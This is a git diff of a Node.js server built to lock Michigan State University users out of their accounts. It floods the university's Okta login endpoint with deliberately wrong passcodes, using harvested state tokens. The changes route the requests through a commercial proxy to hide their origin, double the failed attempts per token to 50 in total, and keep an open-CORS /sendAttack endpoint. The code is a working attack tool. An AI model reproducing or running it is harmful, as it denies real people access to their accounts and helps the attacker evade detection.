@@ -9,10 +9,16 @@ The only way for a victim to recover the account is to call the MSU IT desk.
 const fetch = require("node-fetch")
 const fastify = require('fastify')()
 const browser = require("./browser.js")
+const cors = require('@fastify/cors');
+const HttpsProxyAgent = require('https-proxy-agent');
+
+//register cors
+fastify.register(cors, { });
 
 // vars
 var stateTokens = []
 const requiredTokens = 5  // amount of state tokens we need to trigger detection and disable account
+const proxyAgent = new HttpsProxyAgent('http://p.webshare.io:9999'); //proxy
 
 //addToken - used to add token data to 'stateTokens' var
 function addToken(data) {
@@ -48,9 +54,9 @@ async function attempt_login(account,stateToken) {
     const payload = {
       "identifier": account,
       "credentials": {
-          "passcode": "sparthack"
+          "passcode": "AJSSasGf!y_FjFay!f_1973"
       },
-      "stateHandle": stateToken["token"]
+      "stateHandle": stateToken["stateToken"]
     }
 
     //send fetch request
@@ -72,11 +78,13 @@ async function attempt_login(account,stateToken) {
         "Referer": "https://auth.msu.edu/app/msu_atd2l_1/exk8au7wid9bEq7Jw357/sso/saml?SAMLRequest=jdG7asMwFAbgvdB3MNqtm%2bXIFnYgtEsgXZI2Q5eiynJisCVXRyp9%2fDoNoR27nQs%2ffJzTbFI8u739SBZitn1sEehpDNf%2brSokL%2fuaUll1wphOl6yv%2b44yU64MFz3KjjbA4F2LOKYo2wIku3UQtYvLiPIipyzn1TNnSlSKFlhKyUpWvKJsA2BDXLIP3kGabDjY8DkY%2b7Lftegc4wyKkI6PeIKEbZcuNRlnohcwGf1pcORC3V0qvOxQ9jWNDlqUglNewwDK6cmCikYdNk87tQjVHHz0xo9ofX%2bXZc2PN%2fwnqG9atL7ZqJEllx3LacVFLpgQue5pnddlLwxnlq1oh6N1yy0Av4fhdI4wa2Ox8dMvvSFXxAJqyN9nrL8B",
         "Referrer-Policy": "strict-origin-when-cross-origin"
       },
+      agent:proxyAgent,
       "body": JSON.stringify(payload),
       "method": "POST"
     }).then(res => res.json()) //convert to JSON
-    .then(() => {
+    .then((data) => {
       //return back 
+      console.log(JSON.stringify(data))
       resolve(true)
     })
     .catch((err) => { //most likely network error
@@ -85,14 +93,6 @@ async function attempt_login(account,stateToken) {
     })
   })
 }
-
-//CORS middleware
-fastify.addHook('onSend', (request, reply, payload, next) => {
-  reply.header('Access-Control-Allow-Origin', '*')
-  reply.header('Access-Control-Allow-Headers', '*')
-  reply.header('Access-Control-Allow-Methods', 'POST')
-  next()
-})
 
 //run - main route, controls logic of attack
 fastify.post('/sendAttack', async(request, reply) => {
@@ -110,7 +110,7 @@ fastify.post('/sendAttack', async(request, reply) => {
 
     //send attack using tokens
     for(var i=0;i<tokens.length;i++) {
-      for(var x=0;x<5;x++) { //send 5 requests per state token
+      for(var x=0;x<10;x++) { //send 10 requests per state token (50 total)
         const login_attempt = await attempt_login(body["account"], tokens[i])
       
         //check results
@@ -146,7 +146,7 @@ setInterval(() => { state_token_monitor(); }, 30000) //check every 30 seconds
 state_token_monitor();
 
 //start fastify server
-fastify.listen(3000, (err) => {
+fastify.listen(3000, (err) => { //listen on port 80
   if (err) throw err
   console.log(`server listening on ${fastify.server.address().port}`)
 })
